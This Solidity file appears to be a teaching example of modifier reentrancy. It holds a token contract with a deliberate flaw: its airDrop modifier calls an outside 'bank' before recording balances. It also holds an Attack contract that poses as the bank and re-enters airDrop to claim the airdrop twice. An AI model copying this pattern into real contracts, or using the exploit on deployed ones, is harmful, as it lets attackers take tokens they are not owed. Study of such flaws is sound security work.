pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";
    Bank public bank;

    constructor(address _bank) public {
        bank = Bank(_bank);
    }

    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked(name)) ==
                bank.supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return keccak256("Nu Token");
    }
}

contract Attack {
    bool hasBeenCalled;
    ModifierEntrancy public target;

    constructor(address _target) public {
        target = ModifierEntrancy(_target);
    }

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            target.airDrop();
        }
        return keccak256("Nu Token");
    }

    function callTarget() public {
        target.airDrop();
    }
}